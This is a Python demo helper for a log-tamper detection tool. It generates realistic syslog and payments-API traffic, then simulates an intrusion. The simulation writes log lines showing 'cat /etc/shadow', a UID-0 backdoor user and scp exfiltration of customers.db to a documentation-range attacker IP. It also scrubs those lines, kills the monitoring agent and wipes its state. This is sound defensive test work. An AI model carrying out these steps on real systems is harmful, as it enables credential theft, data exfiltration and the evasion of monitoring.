"""Demo helpers: realistic log traffic and the attacker's actions (run on System A).

All IP addresses come from the documentation ranges (RFC 5737), so nothing points at a real host.
"""
from __future__ import annotations

import os
import random
import shutil
import signal
import time
from pathlib import Path

from .ui import c, log

ATTACKER_IP = "203.0.113.66"
BACKDOOR_USER = "sysupdate"


def _ts() -> str:
    """Classic syslog timestamp, e.g. 'Nov  5 10:15:01'."""
    t = time.localtime()
    return f"{time.strftime('%b', t)} {t.tm_mday:>2} {time.strftime('%H:%M:%S', t)}"


def _iso() -> str:
    t = time.time()
    return time.strftime("%Y-%m-%dT%H:%M:%S", time.gmtime(t)) + f".{int(t * 1000) % 1000:03d}Z"


def _append(path: Path, line: str) -> None:
    with open(path, "a", encoding="utf-8") as f:
        f.write(line + "\n")
        f.flush()
        os.fsync(f.fileno())


def _auth_line(host: str) -> str:
    pid = random.randint(1200, 48000)
    r = random.random()
    if r < 0.30:
        user, ip = random.choice([("deploy", "198.51.100.24"), ("backup", "198.51.100.31"), ("ops-anita", "198.51.100.57")])
        return f"{_ts()} {host} sshd[{pid}]: Accepted publickey for {user} from {ip} port {random.randint(40000, 65000)} ssh2: ED25519 SHA256:{os.urandom(8).hex()}"
    if r < 0.55:
        user = random.choice(["admin", "test", "oracle", "ubuntu", "postgres"])
        return f"{_ts()} {host} sshd[{pid}]: Failed password for invalid user {user} from 192.0.2.{random.randint(2, 250)} port {random.randint(30000, 65000)} ssh2"
    if r < 0.72:
        return f"{_ts()} {host} CRON[{pid}]: pam_unix(cron:session): session opened for user www-data(uid=33) by (uid=0)"
    if r < 0.86:
        return f"{_ts()} {host} systemd-logind[812]: New session {random.randint(100, 999)} of user deploy."
    if r < 0.93:
        return f"{_ts()} {host} sshd[{pid}]: Disconnected from user deploy 198.51.100.24 port {random.randint(40000, 65000)}"
    return f"{_ts()} {host} sudo:   deploy : TTY=pts/0 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart payments-api"


def _app_line() -> str:
    r = random.random()
    uid = f"u_{random.randint(1000, 9999)}"
    if r < 0.45:
        return f"{_iso()} INFO  payments-api POST /api/v1/payments 201 {random.randint(18, 90)}ms user={uid} amount={random.randint(100, 50000)}.00 INR"
    if r < 0.75:
        return f"{_iso()} INFO  payments-api GET /api/v1/accounts/{uid} 200 {random.randint(4, 30)}ms"
    if r < 0.88:
        return f"{_iso()} WARN  payments-api POST /api/v1/login 401 {random.randint(8, 40)}ms user={uid} reason=bad_password"
    return f"{_iso()} INFO  payments-api settlement batch #{random.randint(1000, 9999)} completed records={random.randint(20, 400)}"


def generate(cfg: dict, rate: float = 1.5) -> None:
    """Write realistic auth/app log traffic until interrupted."""
    srcs = {s["name"]: Path(s["path"]) for s in cfg["sources"]}
    for p in srcs.values():
        p.parent.mkdir(parents=True, exist_ok=True)
        p.touch(exist_ok=True)
    auth = srcs.get("auth.log")
    app = srcs.get("app.log")
    host = cfg["agent_id"]
    log("demo", f"Writing demo log traffic to {', '.join(str(p) for p in srcs.values())} (Ctrl+C to stop)")
    try:
        while True:
            if auth and (not app or random.random() < 0.55):
                line = _auth_line(host)
                _append(auth, line)
            elif app:
                line = _app_line()
                _append(app, line)
            log("demo", c.dim(line[:110]))
            time.sleep(random.uniform(0.4, 2.0) * rate)
    except KeyboardInterrupt:
        pass


def _auth_path(cfg: dict) -> Path:
    for s in cfg["sources"]:
        if s["name"] == "auth.log":
            return Path(s["path"])
    return Path(cfg["sources"][0]["path"])


def _rewrite(path: Path, lines: list[str]) -> None:
    """Rewrite a file the way `sed -i` does (new file + rename)."""
    tmp = path.with_suffix(path.suffix + ".tmp")
    tmp.write_text("".join(ln + "\n" for ln in lines), encoding="utf-8")
    shutil.copymode(path, tmp)
    os.replace(tmp, path)


def attack(cfg: dict, action: str, line: int | None = None, text: str | None = None) -> None:
    auth = _auth_path(cfg)
    host = cfg["agent_id"]
    state = Path(cfg["state_dir"])
    if action == "intrude":
        pid = random.randint(20000, 30000)
        for ln in [
            f"{_ts()} {host} sshd[{pid}]: Failed password for root from {ATTACKER_IP} port 51022 ssh2",
            f"{_ts()} {host} sshd[{pid}]: Accepted password for root from {ATTACKER_IP} port 51022 ssh2",
            f"{_ts()} {host} sshd[{pid}]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)",
            f"{_ts()} {host} sudo:     root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow",
            f"{_ts()} {host} useradd[{pid + 7}]: new user: name={BACKDOOR_USER}, UID=0, GID=0, home=/var/lib/{BACKDOOR_USER}, shell=/bin/bash",
            f"{_ts()} {host} sudo:     root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/scp /srv/app/customers.db {ATTACKER_IP}:/tmp/",
        ]:
            _append(auth, ln)
            time.sleep(0.25)
        print(c.red(f"Attacker {ATTACKER_IP} logged in as root, read /etc/shadow, created backdoor user '{BACKDOOR_USER}'"
                    f" and copied customers.db off the server."))
        return
    if action in ("edit", "delete"):
        lines = auth.read_text(encoding="utf-8").splitlines()
        if line is not None:
            if not 1 <= line <= len(lines):
                raise SystemExit(f"line must be between 1 and {len(lines)}")
            idx = [line - 1]
        else:
            idx = [i for i, ln in enumerate(lines) if ATTACKER_IP in ln or BACKDOOR_USER in ln]
            if not idx:
                raise SystemExit("No attacker lines found. Run './rd attack intrude' first, or pass --line N.")
        if action == "delete":
            keep = [ln for i, ln in enumerate(lines) if i not in set(idx)]
            _rewrite(auth, keep)
            print(c.red(f"Deleted {len(idx)} line(s) from {auth.name}: {', '.join(str(i + 1) for i in idx)}"))
        else:
            for i in idx:
                lines[i] = text if text is not None else (
                    lines[i].replace(ATTACKER_IP, "198.51.100.24").replace("for root", "for deploy")
                    .replace(f"name={BACKDOOR_USER}", "name=backup").replace("cat /etc/shadow", "systemctl status nginx")
                    if (ATTACKER_IP in lines[i] or BACKDOOR_USER in lines[i]) else lines[i] + " (edited)")
            _rewrite(auth, lines)
            print(c.red(f"Rewrote {len(idx)} line(s) in {auth.name} to hide the attacker: {', '.join(str(i + 1) for i in idx)}"))
        return
    if action == "kill":
        pidf = state / "agent.pid"
        if not pidf.exists():
            raise SystemExit("Agent does not appear to be running (no pid file).")
        pid = int(pidf.read_text())
        os.kill(pid, signal.SIGKILL)
        print(c.red(f"Killed the Root-Defense agent (pid {pid}) with SIGKILL - it can no longer report."))
        return
    if action == "wipe":
        pidf = state / "agent.pid"
        if pidf.exists():
            try:
                os.kill(int(pidf.read_text()), signal.SIGKILL)
                print(c.red("Killed the agent first."))
            except ProcessLookupError:
                pass
        shutil.rmtree(state, ignore_errors=True)
        print(c.red(f"Wiped the agent's local database, keys and state ({state})."))
        return
    if action == "truncate":
        _rewrite(auth, [])
        print(c.red(f"Emptied {auth.name} completely."))
        return
    raise SystemExit(f"unknown attack {action}")
